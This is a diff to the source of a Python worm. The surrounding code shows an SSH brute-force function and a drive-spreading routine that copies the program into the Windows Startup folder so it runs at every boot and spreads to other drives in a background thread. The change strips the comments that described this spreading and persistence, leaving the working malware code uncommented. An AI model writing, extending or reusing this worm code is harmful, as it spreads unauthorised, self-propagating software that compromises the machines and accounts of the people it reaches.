@@ -136,11 +136,7 @@ def bruteforce_ssh(host, wordlist):
         time.sleep(5)
 
 def drivespreading():
-    # This function makes the worm copy itself on other drives on the computer
-    # (also on the "startup" folder to be executed every time the computer boots)
-    
-    # WARNING: This function is very obvious to the user. The worm will be suddenly on every drive.
-    # You may want to change the code and e.g. copy the worm only on new drives 
+   
     bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 
     while True:
@@ -159,8 +155,7 @@ def drivespreading():
         time.sleep(3)
 
 def start_drive_spreading():
-    # Starts "drivespreading" function as a threaded function. 
-    # This means that the code will spread on drives and execute other functions at the same time.
+  
     thread = Thread(target = drivespreading)
     thread.start()
     
